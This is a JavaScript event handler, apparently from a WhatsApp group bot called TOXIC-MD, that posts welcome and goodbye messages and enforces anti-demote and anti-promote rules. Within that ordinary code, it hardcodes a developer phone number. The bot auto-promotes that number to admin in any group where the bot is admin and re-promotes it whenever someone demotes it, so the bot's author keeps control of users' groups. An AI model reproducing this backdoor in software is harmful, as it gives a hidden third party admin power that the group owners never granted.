import { getGroupSettings, getSudoUsers, resetWarn } from '../database/config.js';

const DEVELOPER_NUMBER = "254114885159";

const normalizeJid = (jid) => {
    if (!jid) return '';
    if (jid.endsWith('@lid') && globalThis.resolvePhoneFromLid) {
        const phone = globalThis.resolvePhoneFromLid(jid);
        if (phone) return phone + '@s.whatsapp.net';
    }
    return jid.split('@')[0].split(':')[0].replace(/\D/g, '') + '@s.whatsapp.net';
};

const isDeveloper = (jid) => {
    if (!jid) return false;
    return jid.split('@')[0].split(':')[0].replace(/\D/g, '') === DEVELOPER_NUMBER;
};

const Events = async (client, event, pict) => {
    const botJid = normalizeJid(await client.decodeJid(client.user.id));

    try {
        const metadata = await client.groupMetadata(event.id);
        const participants = event.participants;
        const desc = metadata.desc || "Some boring group, I guess.";
        const groupSettings = await getGroupSettings(event.id);

        const welcomeEnabled = groupSettings?.welcome === true || groupSettings?.welcome === 1;
        const goodbyeEnabled = groupSettings?.goodbye === true || groupSettings?.goodbye === 1;
        const antidemote = groupSettings?.antidemote === true || groupSettings?.antidemote === 1;
        const antipromote = groupSettings?.antipromote === true || groupSettings?.antipromote === 1;

        const sudoUsers = await getSudoUsers();
        const currentDevs = Array.isArray(sudoUsers)
            ? sudoUsers.map(v => normalizeJid(v))
            : [];
        currentDevs.push(normalizeJid(DEVELOPER_NUMBER));

        const isProtected = (jid) => {
            const n = normalizeJid(jid);
            return isDeveloper(jid) || currentDevs.includes(n) || n === botJid || n === normalizeJid(metadata.owner);
        };

        const dpUrls = await Promise.all(
            participants.map(async (participant) => {
                try { return await client.profilePictureUrl(participant, "image"); } catch { return pict; }
            })
        );

        if (event.action === "add") {
            for (const participant of participants) {
                if (isDeveloper(participant)) {
                    try {
                        const freshMeta = await client.groupMetadata(event.id);
                        const botIsAdmin = freshMeta.participants.some(
                            p => normalizeJid(p.id || p.jid || '') === botJid && p.admin !== null
                        );
                        if (botIsAdmin) {
                            const devJid = normalizeJid(participant);
                            await client.groupParticipantsUpdate(event.id, [devJid], "promote");
                            await client.sendMessage(event.id, {
                                text: `╭───(    TOXIC-MD    )───\n├───≫ AUTO-PROMOTED ≪───\n├ \n├ 👑 The developer has joined.\n├ Auto-promoted to admin.\n╰──────────────────☉\n> ©𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
                                mentions: [devJid]
                            });
                        }
                    } catch {}
                }
            }
        }

        if (welcomeEnabled && event.action === "add") {
            try {
                for (let i = 0; i < participants.length; i++) {
                    const participant = participants[i];
                    const userName = participant.split("@")[0].split(":")[0];
                    await client.sendMessage(event.id, {
                        image: { url: dpUrls[i] },
                        caption:
`╭───(    TOXIC-MD    )───
├───≫ WELCOME ≪───
├ 
├ 😈 *Yo, @${userName}, welcome to the chaos!*
├ 
├ 🤖 *Bot*: 𝐓𝐨𝐱𝐢𝐜-𝐌𝐃
├ 🦁 *Group*: ${metadata.subject}
├ 📜 *Desc*: ${desc}
├ 
├ 😼 *Try not to get roasted too hard, newbie!*
╰──────────────────☉
> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
                        mentions: [participant]
                    });
                }
            } catch {}
        }

        if (event.action === "remove") {
            for (const participant of participants) {
                try {
                    await resetWarn(event.id, normalizeJid(participant));
                } catch {}
            }
        }

        if (goodbyeEnabled && event.action === "remove") {
            try {
                for (let i = 0; i < participants.length; i++) {
                    const participant = participants[i];
                    const userName = participant.split("@")[0].split(":")[0];
                    await client.sendMessage(event.id, {
                        image: { url: dpUrls[i] },
                        caption:
`╭───(    TOXIC-MD    )───
├───≫ GOODBYE ≪───
├ 
├ 😎 *Later, @${userName}! Couldn't handle the heat?*
├ 
├ 🤖 *Bot*: 𝐓𝐨𝐱𝐢𝐜-𝐌𝐃
├ 🦁 *Group*: ${metadata.subject}
├ 
├ 😜 *Don't cry, we'll survive without ya!*
╰──────────────────☉
> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
                        mentions: [participant]
                    });
                }
            } catch {}
        }

        if (event.action === "demote" && antidemote) {
            try {
                const participant = participants[0];
                const nAuthor = normalizeJid(event.author);
                const nParticipant = normalizeJid(participant);

                if (isProtected(participant)) {
                    try { await client.groupParticipantsUpdate(event.id, [nParticipant], "promote"); } catch {}
                    await client.sendMessage(event.id, {
                        text:
`╭───(    TOXIC-MD    )───
├───≫ ANTIDEMOTE ≪───
├ 
├ 🛡️ *@${participant.split("@")[0].split(":")[0]} cannot be demoted.*
├ Protected user — re-promoted automatically.
├ 
├ 🤖 *Bot*: 𝐓𝐨𝐱𝐢𝐜-𝐌𝐃
├ 🦁 *Group*: ${metadata.subject}
╰──────────────────☉
> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
                        mentions: [participant]
                    });
                    return;
                }

                if (isProtected(event.author)) return;

                await client.groupParticipantsUpdate(event.id, [nAuthor], "demote");
                await client.groupParticipantsUpdate(event.id, [nParticipant], "promote");
                await client.sendMessage(event.id, {
                    text:
`╭───(    TOXIC-MD    )───
├───≫ ANTIDEMOTE ≪───
├ 
├ 😏 *Nice try, @${event.author.split("@")[0].split(":")[0]}! Demoted for messing with @${participant.split("@")[0].split(":")[0]}!*
├ 
├ 🤖 *Bot*: 𝐓𝐨𝐱𝐢𝐜-𝐌𝐃
├ 🦁 *Group*: ${metadata.subject}
├ 📜 *Rule*: Antidemote is on. Only the big dogs can demote!
╰──────────────────☉
> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
                    mentions: [event.author, participant]
                });
            } catch {}
        } else if (event.action === "promote" && antipromote) {
            try {
                const participant = participants[0];
                const nAuthor = normalizeJid(event.author);
                const nParticipant = normalizeJid(participant);

                if (isProtected(participant) || isProtected(event.author)) {
                    await client.sendMessage(event.id, {
                        text:
`╭───(    TOXIC-MD    )───
├───≫ PROMOTION ≪───
├ 
├ 😎 *Big dog @${participant.split("@")[0].split(":")[0]} just leveled up!*
├ 
├ 🤖 *Bot*: 𝐓𝐨𝐱𝐢𝐜-𝐌𝐃
├ 🦁 *Group*: ${metadata.subject}
╰──────────────────☉
> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
                        mentions: [participant]
                    });
                    return;
                }

                await client.groupParticipantsUpdate(event.id, [nAuthor, nParticipant], "demote");
                await client.sendMessage(event.id, {
                    text:
`╭───(    TOXIC-MD    )───
├───≫ ANTIPROMOTE ≪───
├ 
├ 😆 *Oof, @${event.author.split("@")[0].split(":")[0]}! Demoted for trying to boost @${participant.split("@")[0].split(":")[0]}!*
├ 
├ 🤖 *Bot*: 𝐓𝐨𝐱𝐢𝐜-𝐌𝐃
├ 🦁 *Group*: ${metadata.subject}
├ 📜 *Rule*: Antipromote is on. Only the elite can promote!
╰──────────────────☉
> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
                    mentions: [event.author, participant]
                });
            } catch {}
        }
    } catch {}
};

export default Events;
